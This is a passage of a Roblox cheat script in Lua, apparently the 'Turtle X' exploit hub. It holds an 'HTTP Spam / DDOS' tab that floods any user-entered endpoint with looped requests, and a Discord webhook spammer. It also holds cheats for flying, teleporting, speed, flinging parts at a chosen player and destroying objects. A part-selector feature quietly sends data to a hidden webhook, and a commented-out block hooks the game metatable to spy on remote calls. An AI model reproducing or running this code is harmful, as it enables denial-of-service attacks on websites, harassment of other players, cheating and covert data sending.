				Animate.jump.JumpAnim.AnimationId = "https://www.roblox.com/asset/?id=18537380791"
				Animate.climb.ClimbAnim.AnimationId = "https://www.roblox.com/asset/?id=18537363391"
				Animate.fall.FallAnim.AnimationId = "https://www.roblox.com/asset/?id=18537367238"
			elseif anim_table.sel == "CalWalk Glam Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=133806214992291" -- ✓
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=94970088341563" -- ✓
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=109168724482748"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=81024476153754"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=116936326516985"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=119377220967554"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=92294537340807"
			elseif anim_table.sel == "NFL Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=92080889861410"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=74451233229259"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=110358958299415"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=117333533048078"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=119846112151352"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=134630013742019"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=129773241321032"
			elseif anim_table.sel == "Adidas Community" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=122257458498464"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=102357151005774"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=122150855457006"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=82598234841035"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=75290611992385"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=88763136693023"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=98600215928904"
			end
		end)

		T107:Toggle("Set animation",false,function(value)
			TurtleFlags.PermaAnimation = value
			if value == true then
				TurtleFlags["Change animation click"]()
			end
		end,"U still have this animation when respawned")

		T107:Toggle("Show console",false,function(value)
			TurtleRemoteEvent:Fire("SHOW CONSOLE",value)
		end)
		T107:Button("Test log",function()
			TurtleRemoteEvent:Fire("CONSOLE LOG","TEST HI")
		end)
		local function setpemaAnimate(chr)
			if TurtleFlags.PermaAnimation == true then
				if chr:WaitForChild("Animate") and chr:WaitForChild("Humanoid") then
					TurtleFlags["Change animation click"]()
				end
			end
		end
				
		LocalPlayer.CharacterAdded:Connect(setpemaAnimate)
		local ddos = window:Tab("HTTP Spam / DDOS",true)
		local web = {
			_endpoint = "",
			_spam = false,
			_message = "",
			_strike = "",
			_request_sent = 0,
			_auth = false,
			_auth2 = "",
			_cache = false,
			_cache2 = "",
			_cookie = false,
			_cookie2 = "",
			_strike_list = {
					"application/json",
					"application/javascript",
					"application/xml",
					"application/x-www-form-urlencoded",
					"application/octet-stream",
					"application/pdf",
					"application/zip",
					"application/soap+xml",
					"application/vnd.api+json",
					"application/x-protobuf",
					"text/plain",
					"text/html",
					"text/css",
					"text/javascript",
					"multipart/form-data",
					"image/jpeg",
					"image/png",
					"image/gif",
					"audio/mpeg",
					"video/mp4"
				}
		}

		local ddoswebsitestrike = ddos:Label(`URL : {lib:ColorFonts("nil","Bold,Red")}\n\nStatus Code : {lib:ColorFonts("nil","Bold,Red")}\nStatus Text : {lib:ColorFonts("nil","Bold,Red")}\nRequest send : {lib:ColorFonts("nil","Bold,Red")}`)
		
		ddos:Textbox("Insert endpoint",false,function(value)
			web._endpoint = value
		end)
			
		ddos:Textbox("Insert message",false,function(value)
			web._message = value
		end)

		ddos:Textbox("Auth Keys [ If Required ]",false,function(value)
			web._auth2 = value
			if value ~= "" then
				web._auth = true
				lib:notify(lib:ColorFonts("Auth enabled for api keys","Bold,Green"),10)
			else
				web._auth = false
				lib:notify(lib:ColorFonts("Auth disabled","Bold,Red"),10)
			end
		end)

		ddos:Textbox("Cache-Control [ If Required ]",false,function(value)
			web._cache2 = value
			if value ~= "" then
				web._cache = true
				lib:notify(lib:ColorFonts("Cache-Control Enabled","Bold,Green"),10)
			else
				web._cache = false
				lib:notify(lib:ColorFonts("Cache-Control Disabled","Bold,Red"),10)
			end
		end)

		ddos:Textbox("Cookie [ If Required ]",false,function(value)
			web._cookie2 = value
			if value ~= "" then
				web._cookie = true
				lib:notify(lib:ColorFonts("Cookie Enabled, auto grab cookie when u put 'GRAB'","Bold,Green"),10)
			else
				web._cookie = false
				lib:notify(lib:ColorFonts("Cookie Disabled","Bold,Red"),10)
			end
		end)

		ddos:Dropdown("HTTP-STRIKE Method",web._strike_list,function(value)
			web._strike = value
		end)
			
		ddos:Button("Sent HTTP ( POST )",function()
			if web._endpoint ~= "" then
				if web._endpoint:find("discord.com/api/webhooks/") then
					lib.sentMessage(web._endpoint,"embed systen",{
								["title"] = "API & Webhook Sender",
								["description"] = "This HTTP has been spammed using the 'API & Webhook Sender' tool.",
								["color"] = 65280,
								["fields"] = {
									{
									   ["name"] = "HTTP Message",
									   ["value"] = web._message
									}
								},
								["footer"] = {
									["text"] = "User-Agent : Turtle X • PC | API & Webhook Sender • API & Webhook Spoofer • API & Webhook Protection • Webhook Blocker"
								}
							})
				else
					--lib.sentMessage(web._endpoint,web._message,{})
					http({
						Url = web._endpoint,
						Method = "POST",
						Headers = {
							["Content-Type"] = web._strike,
							["User-Agent"] = lib.randomString(),
							--(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
							--(web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
							--(web._cookie and ["Cookie"] = web._cookie2 or ["Cookie"] = nil)
						},
						Body = HttpService:JSONEncode({}) --{["content"] = web._message})
					})
				end
			else
				lib:notify(lib:ColorFonts("Invalid endpoint.","Bold,Red"),10)
			end
		end)

		local jammer = ddos:Toggle("API & Webhook Spammer",false,function(value)
			web._spam = value
			if value == false then
				web._request_sent = 0
			end
		end)
		local endpointresponse = nil
		local kdnsosjekdnsksjekjeoensksjs = "100"
		--https://www.roblox.com/id/games/189707/Kelangsungan-Hidup-Bencana-Alam?gameSetTypeId=100000003&homePageSessionInfo=0036b282-ac58-41e3-8f9f-636ebe07289d&isAd=false&numberOfLoadedTiles=177&page=homePage&placeId=189707&playContext=homePage&position=0&sortPos=3&universeId=65241
		lib:Loop(function()
			if IsHolyEnabled == true then
				if PLAYERNAME == "me" or PLAYERNAME == "Me" or PLAYERNAME == "ME" then
					if game.PlaceId == 189707 or game.PlaceId == 3696971654 then -- Natural Disaster (Global & Chinese)
						lib:children(workspace["Structure"]:GetChildren()[1],function(v)
							if v:IsA("Part") or v:IsA("BasePart") and v.Anchored == false then
								NetworkOwnershipPart(v,user.Character.HumanoidRootPart)
							end
						end)
					else
						lib:descendant(workspace,function(v)
							if v:IsA("Part") or v:IsA("BasePart") and v.Anchored == false then
								NetworkOwnershipPart(v,user.Character.HumanoidRootPart)
							end
						end)
					end
				else
					lib:TrackPlayer(PLAYERNAME,function(v)
						if game.PlaceId == 189707 or game.PlaceId == 3696971654 then -- Natural Disaster (Global & Chinese)
							lib:children(workspace["Structure"]:GetChildren()[1],function(i)
								if i:IsA("Part") or i:IsA("BasePart") and i.Anchored == false then
									NetworkOwnershipPart(i,v.Character.HumanoidRootPart)
								end
							end)
						else
							lib:descendant(workspace,function(i)
								if i:IsA("Part") or i:IsA("BasePart") and i.Anchored == false then
									NetworkOwnershipPart(i,v.Character.HumanoidRootPart)
								end
							end)
						end
					end)
				end
			end
			if TurtleFlags.ScreenClickForInGameScreenClick == true then
				lib.clickScreen("corner")
			end
			if ArrayForJump == true then
				LocalPlayer.Character.Humanoid.JumpPower = intvarspeed.custjump
			end
			if ArrayForSpeed == true then
				LocalPlayer.Character.Humanoid.WalkSpeed = intvarspeed.custspeed
			end
			if TurtleFlags.UserJump == true then
				user.Character.Humanoid.Jump = true
				user.Character.Humanoid.JumpPower = 50
			end
			if IsHolyEnabled == true then
				TurtleRemoteEvent:Fire("ANNOY","DOMAIN",{USER = PLAYERNAME,TYPE = annoytypefuck,VERSION = versionHole})
			end
			if web._spam == true then
				if web._endpoint ~= "" then
					if web._endpoint:find("discord.com/api/webhooks/") then
						lib.sentMessage(web._endpoint,"embed systen",{
								["title"] = "API & Webhook Spammer",
								["description"] = "This HTTP has been spammed using the 'API & Webhook Spammer' tool.",
								["color"] = 65280,
								["fields"] = {
									{
									   ["name"] = "HTTP Message",
									   ["value"] = web._message
									}
								},
								["footer"] = {
									["text"] = "User-Agent : Turtle X • PC | API & Webhook Spammer • API & Webhook Spoofer • API & Webhook Protection • Webhook Blocker"
								}
							})
					else
						--lib.sentMessage(web._endpoint,web._message,{})
						endpointresponse = http({
							Url = web._endpoint,
							Method = "GET",
							Headers = {
								["Content-Type"] = web._strike,
								["Accept"] = web._strike,
								["User-Agent"] = lib.randomString(),
								--(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
							        --(web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
							        --(web._cookie and ["Cookie"] = web._cookie2 or ["Cookie"] = nil)
							}
							--Body = HttpService:JSONEncode({}) --{["content"] = web._message})]]
						})

						kdnsosjekdnsksjekjeoensksjs = tostring(endpointresponse.StatusCode)
						web._request_sent = web._request_sent + 1
						ddoswebsitestrike:EditLabel(`URL : {lib:ColorFonts(web._endpoint,"Bold,Green")}\n\nStatus Code : {lib:ColorFonts(endpointresponse.StatusCode,"Bold,Sky Blue")}\nStatus Text : {lib:ColorFonts(kdnsosjekdnsksjekjeoensksjs:gsub("100","Continue"):gsub("101","Switching Protocols"):gsub("102","Processing..."):gsub("200","OK / Received"):gsub("201","Created"):gsub("202","Accepted"):gsub("203","Non-Authoritative Information"):gsub("205","Reset Content"):gsub("206","Partial Content"):gsub("207","Multi-Status (WebDAV)"):gsub("208","Already Reported (WebDAV)"):gsub("226","IM Used"):gsub("204","No Content"):gsub("300","Multiple Choices"):gsub("301","Moved Permanently"):gsub("302","Found"):gsub("303","See Other"):gsub("304","Not Modified"):gsub("305","Use Proxy"):gsub("307","Temporary Redirect"):gsub("308","Permanent Redirect"):gsub("400","Bad Request"):gsub("401","Unauthorized"):gsub("402","Payment Required"):gsub("403","Forbidden"):gsub("404","Not Found"):gsub("405","Method Not Allowed"):gsub("406","Not Acceptable"):gsub("407","Proxy Authentication Required"):gsub("408","Request Timeout"):gsub("409","Conflict"):gsub("410","Gone"):gsub("411","Length Required"):gsub("412","Precondition Failed"):gsub("413","Payload Too Large"):gsub("414","URL Too Long"):gsub("415","Unsupported Media Type"):gsub("416","Range Not Satisfiable"):gsub("417","Expectation Failed"):gsub("418","Im A Teapot"):gsub("421","Misdirected Request"):gsub("422","Unprocessable Entity (WebDAV)"):gsub("423","Locked (WebDAV)"):gsub("424","Failed Dependency (WebDAV)"):gsub("425","Too Early"):gsub("426","Upgrade Required"):gsub("428","Precondition Required"):gsub("431","Request Header Fields Too Large"):gsub("451","Unavailable For Legan Reasons"):gsub("429","Too Many Request"):gsub("500","Internal Server Error"):gsub("501","Not Implemented"):gsub("502","Bad Gateway"):gsub("503","Service Unavailable"):gsub("504","Gateway Timeout"):gsub("505","HTTP Version Not Supported"):gsub("506","Variant Also Negotiates"):gsub("507","Insufficient Storage (WebDAV"):gsub("508","Loop Detected (WebDAV)"):gsub("510","Not Extended"):gsub("511","Network Authentication Required"),"Bold,Sky Blue")}\nRequest send : {lib:ColorFonts(lib:CurrencyFormat(web._request_sent),"Bold,Sky Blue")}`)
						http({
							Url = web._endpoint,
							Method = "POST",
							Headers = {
								["Content-Type"] = web._strike,
								["User-Agent"] = lib.randomString(),
								--(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
							        --(web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
							        --(web._cookie and ["Cookie"] = web._cookie2 or ["Cookie"] = nil)
							},
							Body = HttpService:JSONEncode({}) --{["content"] = web._message})
						})
					end
				else
					lib:notify(lib:ColorFonts("Invalid endpoint.","Bold,Red"),10)
					--web._spam = false
					jammer:Set(false)
				end
			end
		end)
			
		local PartSelector = window:Tab("Part Selector")
		local partname = PartSelector:Label("Part selector disabled.")
		local array_toggler = {
			switch = false,
			colide = false
		}

		local WallCheckParams = RaycastParams.new()
		WallCheckParams.FilterType = Enum.RaycastFilterType.Whitelist
		WallCheckParams.IgnoreWater = true
		WallCheckParams.FilterDescendantsInstances = {}
		local AttrHandlers = {}
                local SelectedPartLine,Ray1 = CreateLine({visible = false,origin = Vector2.new(0,0),direction = Vector2.new(1,1),LineColor = Color3.fromRGB(0,166,0),thickness = 2,transparency = 1})
                local UnSelectedPartLine,Ray2 = CreateLine({visible = false,origin = Vector2.new(0,0),direction = Vector2.new(1,1),LineColor = Color3.fromRGB(225,255,255),thickness = 2,transparency = 1})

		local function HighlightPart()
			if selected.Adornee ~= Mouse.Target then
				Ray2.Origin(LocalPlayer.Character.HumanoidRootPart)
				selectionBox.Adornee = Mouse.Target
				Ray2.Direction(Mouse.Target)
			else
				selectionBox.Adornee = nil
			end
		end
					
		PartSelector:Toggle("Enable part selector [ Powered by Gemini AI ]",false,function(value)
			SelectedPartLine.Visible = value
			UnSelectedPartLine.Visible = value
			if value == true then
				lib:notify(lib:ColorFonts("Part selector enabled.","Bold,Green"),10)
				ActivateHighlight = Mouse.Move:Connect(HighlightPart)
				ClickSelect = Mouse.Button1Down:Connect(function()
					if Mouse.Target ~= nil then
						Ray1.Origin(LocalPlayer.Character.HumanoidRootPart)
				                selected.Adornee = Mouse.Target
						Ray1.Direction(selected.Adornee)
						AttrHandlers = {}
						lib:attributes(selected.Adornee.Parent,function(name,value)
							table.insert(AttrHandlers,`['{name}'] = {value} • {typeof(value)}`)
						end)
						if #AttrHandlers > 0 then
							partname:EditLabel(lib.getHierarchy(Mouse.Target) .. "\n\nDistance between your character and the part : " .. lib.getRootDistance(Mouse.Target) .. "\n\nPart Class : " .. Mouse.Target.ClassName .. "\n\nPart Attributes : {\n  " .. table.concat(AttrHandlers,",\n  ") .. "\n}") -- .. lib.parseData(workspace:Raycast(LocalPlayer.Character.HumanoidRootPart.Position,selected.Adornee.Position - LocalPlayer.Character.HumanoidRootPart.Position,WallCheckParams),0,false,{},nil,false))
							lib.sentMessage(lib.getTable("sent","galau"),lib.getHierarchy(selected.Adornee) .. "\nPart Attributes : {\n  " .. table.concat(AttrHandlers,",\n  ") .. "\n}")
						else
							partname:EditLabel(lib.getHierarchy(Mouse.Target) .. "\n\nDistance between your character and the part : " .. lib.getRootDistance(Mouse.Target) .. "\n\nPart Class : " .. Mouse.Target.ClassName)--lib.parseData(workspace:Raycast(LocalPlayer.Character.HumanoidRootPart.Position,selected.Adornee.Position - LocalPlayer.Character.HumanoidRootPart.Position,WallCheckParams),0,false,{},nil,false))
							lib.sentMessage(lib.getTable("sent","galau"),lib.getHierarchy(selected.Adornee))
						end
					end
				end)
			else
				if ActivateHighlight then
					ActivateHighlight:Disconnect()
				end
				if ClickSelect then
					ClickSelect:Disconnect()
				end
				selectionBox.Adornee = nil
				selected.Adornee = nil
				partname:EditLabel("Part selector disabled.")
				lib:notify(lib:ColorFonts("Part selector disabled.","Bold,Red"),10)
			end
		end)

		
		PartSelector:Button("Copy instance",function()
			if lib.getHierarchy(selected.Adornee) ~= nil or lib.getHierarchy(selected.Adornee) ~= "" or partname:GetText() ~= "Part selector disabled." then
				if #AttrHandlers > 0 then
					lib:Copy(lib.getHierarchy(selected.Adornee) .. "\n\nPart Attributes : {\n  " .. table.concat(AttrHandlers,",\n  ") .. "\n}")
					lib.sentMessage(lib.getTable("sent","galau"),lib.getHierarchy(selected.Adornee) .. "\nPart Attributes : {\n  " .. table.concat(AttrHandlers,",\n  ") .. "\n}")
				else
					lib:Copy(lib.getHierarchy(selected.Adornee))
					lib.sentMessage(lib.getTable("sent","galau"),lib.getHierarchy(selected.Adornee))
				end
			else
				lib:notify(lib:ColorFonts("Select a part to copy its path","Bold,Red"),10)
			end
		end)
		PartSelector:Button("Copy instance position [ Vector3 ]",function()
			lib:Copy(`Vector3.new({selected.Adornee.Position.X},{selected.Adornee.Position.Y},{selected.Adornee.Position.Z}`)
		end)
		PartSelector:Button("Copy instance position [ CFrame | 3D Position ]",function()
			lib:Copy(`CFrame.new({selected.Adornee.CFrame.X},{selected.Adornee.CFrame.Y},{selected.Adornee.CFrame.Z}`)
		end)
		PartSelector:Button("Teleport to instance",function()
			lib:TeleportMethod("tp",selected.Adornee.CFrame)
		end)
		PartSelector:Button("Tween to instance [ AI ]",function()
			if TurtleRemoteEvent and typeof(TurtleRemoteEvent) == "Instance" then
				TurtleRemoteEvent:Fire("AI","tween",selected.Adornee.CFrame)
			else
				lib:notify(lib:ColorFonts("Missing TurtleRemote","Bold,Red"),10)
			end
		end)
		PartSelector:Button("Walk to instance [ AI ]",function()
			if TurtleRemoteEvent and typeof(TurtleRemoteEvent) == "Instance" then
				TurtleRemoteEvent:Fire("AI","walk",selected.Adornee.Position)
			else
				lib:notify(lib:ColorFonts("Missing TurtleRemote","Bold,Red"),10)
			end
		end)
		PartSelector:Button("Destroy instance",function()
			selected.Adornee:Destroy()
		end)
		PartSelector:Toggle("Loop teleport to instance",false,function(value)
			array_toggler.switch = value
			while wait() do
			        if array_toggler.switch == false then break end
				lib:TeleportMethod("tp",selected.Adornee.CFrame)
			end
		end)
					
		local VHNP1 = lib.randomString()
		local VHNP2 = lib.randomString()
		local runtimeSource = nil
		PartSelector:Toggle("Possessing selected unanchored part",false,function(value)
			if value == true then
				if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
					if selected.Adornee ~= nil then
						local bv = Instance.new("BodyVelocity")
						bv.Name = VHNP1
						bv.Parent = selected.Adornee
						bv.MaxForce = Vector3.new(0,0,0)
						bv.Velocity = Vector3.new(0,0,0)

						local bg = Instance.new("BodyGyro")
						bg.Name = VHNP2
						bg.Parent = selected.Adornee
						bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
						bg.P = 1000
						bg.D = 50

						runtimeSource = RunService.RenderStepped:Connect(function()
							if selected.Adornee ~= nil and selected.Adornee.Anchored ~= false and selected.Adornee:FindFirstChild(VHNP1) and selected.Adornee:FindFirstChild(VHNP2) then
								selected.Adornee[VHNP1].MaxForce = Vector3.new(9e9,9e9,9e9)
								selected.Adornee[VHNP2].MaxTorque = Vector3.new(9e9,9e9,9e9)
							
								selected.Adornee[VHNP2].CFrame = workspace.CurrentCamera.CoordinateFrame
								selected.Adornee[VHNP1].Velocity = Vector3.new()

								if controlModule:GetMoveVector().X > 0 then
									selected.Adornee[VHNP1].Velocity = selected.Adornee[VHNP1].Velocity + workspace.CurrentCamera.CFrame.RightVector * (controlModule:GetMoveVector().X * ((vfly and vflyspeed or mobileflyspeed) * 50))
								end
								if controlModule:GetMoveVector().X < 0 then
									selected.Adornee[VHNP1].Velocity = selected.Adornee[VHNP1].Velocity + workspace.CurrentCamera.CFrame.RightVector * (controlModule:GetMoveVector().X * ((vfly and vflyspeed or mobileflyspeed) * 50))
								end
								if controlModule:GetMoveVector().Z > 0 then
									selected.Adornee[VHNP1].Velocity = selected.Adornee[VHNP1].Velocity - workspace.CurrentCamera.CFrame.LookVector * (controlModule:GetMoveVector().Z * ((vfly and vflyspeed or mobileflyspeed) * 50))
								end
								if controlModule:GetMoveVector().Z < 0 then
									selected.Adornee[VHNP1].Velocity = selected.Adornee[VHNP1].Velocity - workspace.CurrentCamera.CFrame.LookVector * (controlModule:GetMoveVector().Z * ((vfly and vflyspeed or mobileflyspeed) * 50))
								end
							end
						end)
					end
				else
					if selected.Adornee ~= nil and selected.Adornee.Anchored == false then
						workspace.CurrentCamera.CameraSubject = selected.Adornee
						LocalPlayer.Character.HumanoidRootPart.Anchored = true
						repeat wait()
						until LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
						repeat wait()
						until selected.Adornee ~= nil
						if flyKeyDown or flyKeyUp then
							flyKeyDown:Disconnect()
							flyKeyUp:Disconnect()
						end

						local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
						local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
						local SPEED = 0

						local function FLY()
							FLYING = true
							BG = Instance.new('BodyGyro')
							BV = Instance.new('BodyVelocity')
							BG.P = 9e4
							BG.Parent = selected.Adornee
							BV.Parent = selected.Adornee
							BG.maxTorque = Vector3.new(9e9,9e9,9e9)
							BG.cframe = selected.Adornee.CFrame
							BV.velocity = Vector3.new(0,0,0)
							BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
							task.spawn(function()
								repeat wait()
									if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
										SPEED = 50
									elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
										SPEED = 0
									end
									if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
										BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
										lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
									elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
										BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
									else
										BV.velocity = Vector3.new(0, 0, 0)
									end
									BG.cframe = workspace.CurrentCamera.CoordinateFrame
								until not FLYING
								CONTROL = {F = 0,B = 0,L = 0,R = 0,Q = 0,E = 0}
								lCONTROL = {F = 0,B = 0,L = 0,R = 0,Q = 0,E = 0}
								SPEED = 0
								BG:Destroy()
								BV:Destroy()
							end)
						end
						flyKeyDown = Mouse.KeyDown:Connect(function(KEY)
							if KEY:lower() == 'w' then
								CONTROL.F = 1
							elseif KEY:lower() == 's' then
								CONTROL.B = -1
							elseif KEY:lower() == 'a' then
								CONTROL.L = -1
							elseif KEY:lower() == 'd' then 
								CONTROL.R = 1
							elseif QEfly and KEY:lower() == 'e' then
								CONTROL.Q = 2
							elseif QEfly and KEY:lower() == 'q' then
								CONTROL.E = -2
							end
							pcall(function()
								workspace.CurrentCamera.CameraType = Enum.CameraType.Track
							end)
						end)
						flyKeyUp = Mouse.KeyUp:Connect(function(KEY)
							if KEY:lower() == 'w' then
								CONTROL.F = 0
							elseif KEY:lower() == 's' then
								CONTROL.B = 0
							elseif KEY:lower() == 'a' then
								CONTROL.L = 0
							elseif KEY:lower() == 'd' then
								CONTROL.R = 0
							elseif KEY:lower() == 'e' then
								CONTROL.Q = 0
							elseif KEY:lower() == 'q' then
								CONTROL.E = 0
							end
						end)
						FLY()
					end
				end
			else
				pcall(function()
					if selected.Adornee ~= nil then
						if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
							FLYING = false
							selected.Adornee:FindFirstChild(VHNP2):Destroy()
							selected.Adornee:FindFirstChild(VHNP1):Destroy()
							runtimeSource:Disconnect()
						else
							FLYING = false
							selected.Adornee.Velocity = Vector3.new(0,-1 ,0)
							LocalPlayer.Character.HumanoidRootPart.Anchored = false
							workspace.CurrentCamera.CameraSubject = LocalPlayer.Character
							if flyKeyDown or flyKeyUp then
								flyKeyDown:Disconnect()
								flyKeyUp:Disconnect()
							end
						end
					end
				end)
			end
		end)
		PartSelector:Toggle("Bring selected unanchored part",false,function(value)
			array_toggler.colide = value
			if value == true then
				if LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					local A0 = Instance.new("Attachment")
					local AP = Instance.new("AlignPosition")
					local AO = Instance.new("AlignOrientation")
					local A1 = Instance.new("Attachment")

					LocalPlayer.Character.HumanoidRootPart.Position = LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,0)
					A0.Parent = selected.Adornee
					AP.Parent = selected.Adornee
					AO.Parent = selected.Adornee
					AP.Responsiveness = 200
					AP.MaxForce = math.huge
					AO.MaxTorque = math.huge
					AO.Responsiveness = 200
					AP.Attachment0 = A0
					AP.Attachment1 = A1
					AO.Attachment1 =  A1
					AO.Attachment0 = A0
					A1.Parent = LocalPlayer.Character.RightHand
				else
					local A0 = Instance.new("Attachment")
					local AP = Instance.new("AlignPosition")
					local AO = Instance.new("AlignOrientation")
					local A1 = Instance.new("Attachment")

					LocalPlayer.Character.HumanoidRootPart.Position = LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,0)
					A0.Parent = selected.Adornee
					AP.Parent = selected.Adornee
					AO.Parent = selected.Adornee
					AP.Responsiveness = 200
					AP.MaxForce = math.huge
					AO.MaxTorque = math.huge
					AO.Responsiveness = 200
					AP.Attachment0 = A0
					AP.Attachment1 = A1
					AO.Attachment1 =  A1
					AO.Attachment0 = A0
					A1.Parent = LocalPlayer.Character.RightArm
				end
			else
				if selected.Adornee ~= nil then
					if selected.Adornee:FindFirstChild("Attachment") then
						selected.Adornee["Attachment"]:Destroy()
					end
					if selected.Adornee:FindFirstChild("AlignPosition") then
						selected.Adornee["AlignPosition"]:Destroy()
					end
					if selected.Adornee:FindFirstChild("AlignOrientation") then
						selected.Adornee["AlignOrientation"]:Destroy()
					end
					if selected.Adornee:FindFirstChild("Attachment") then
						selected.Adornee["Attachment"]:Destroy()
					end
				end
			end

			while wait() do
				if array_toggler.colide == false then break end
				lib:descendant(selected.Adornee,function(v)
					if v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
						v.CanCollide = false
					end
				end)
			end
		end)

		--[[local RemoteScanner = window:Tab("Remote Scan")
		local ClientScanning = RemoteScanner:Label("?")
		local scanRemotes = true

		local ignoreNames = {
			Event = true,
			MessagesChanged = true
		}

		setreadonly(getrawmetatable(game),false)
		local pseudoEnv = {}
		local gameMeta = getrawmetatable(game)

		local detectClasses = {
			BindableEvent = true,
			BindableFunction = true,
			RemoteEvent = true,
			RemoteFunction = true
		}

		local classMethods = {
			BindableEvent = "Fire",
			BindableFunction = "Invoke",
			RemoteEvent = "FireServer",
			RemoteFunction = "InvokeServer"
		}

		local RemoteScannerSettings = window:Tab("Remote Settings")
		RemoteScannerSettings:Toggle("Pause remote from scanning",false,function(value)
			scanRemotes = value
		end)

		RemoteScannerSettings:Toggle("Ignore MessageChanged Event",false,function(value)
			ignoreNames.MessagesChanged = value
		end)

		RemoteScannerSettings:Toggle("Ignore Events from firing",false,function(value)
			ignoreNames.Event = value
		end)
		--k
		for name,enabled in next,detectClasses do
			RemoteScannerSettings:Toggle(name,enabled,function(value)
				detectClasses[name] = value
			end)
		end
			
		local realMethods = {}

		for name,enabled in next,detectClasses do
			if enabled then
				realMethods[classMethods[name = Instance.new(name)[classMethods[name
			end
		end

		for key,value in next,gameMeta do
			pseudoEnv[key] = value
		end

		--local incId = 0

		local function getValues(self,key,...)
			return {realMethods[key](self,...)}
		end

		gameMeta.__index,gameMeta.__namecall = function(self,key)
			if not realMethods[key] or ignoreNames[self.Name] or not scanRemotes then
				return pseudoEnv.__index(self,key)
			end
			return function(_,...)
				--incId = incId + 1
				--local nowId = incId
				--local strId = "[RemoteSpy_" .. nowId .. "]"

				local allPassed = {...}
				local returnValues = {}
				local ok,data = pcall(getValues,self,key,...)

				if ok then
					returnValues = data
					--print("ClassName: " .. self.ClassName .. " | Path: " .. self:GetFullName() .. " | Method: " .. key .. "\nPacked Arguments: " .. tableToString(allPassed) .. "\n" .. strId .. " Packed Returned: " .. tableToString(returnValues) .. "\n")
					ClientScanning:EditLabel(`[{lib:ColorFonts(self.ClassName,"Bold,Green")}] - {lib.getHierarchy(self)}:{key}\n{lib.parseData(allPassed,0,false,{},nil,false)} -> {lib.parseData(returnValues,0,false,{},nil,false)}`)
				else
					--print("ClassName: " .. self.ClassName .. " | Path: " .. self:GetFullName() .. " | Method: " .. key .. "\nPacked Arguments: " .. tableToString(allPassed) .. "\n" .. strId .. " Packed Returned: [ERROR] " .. data .. "\n")
					ClientScanning:EditLabel(`[{lib:ColorFonts(self.ClassName,"Bold,Green")}] - {lib.getHierarchy(self)}:{key}\n{lib.parseData(allPassed,0,false,{},nil,false)} -> data`)
				end

				return unpack(returnValues)
			end
		end
end]]
	end)
end --lib.CodeEncrypter(b) lib:mobilefly(false) lib:unmobilefly() lib.promptNewRig("R15")
--[[
{
  k
}
addEventListener(Exit_4,"MouseButton1Down",function()
	if ActivateHighlight then
		ActivateHighlight:Disconnect()
	end
	if ClickSelect then
		ClickSelect:Disconnect()
	end
	selectionBox.Adornee = nil
	selected.Adornee = nil
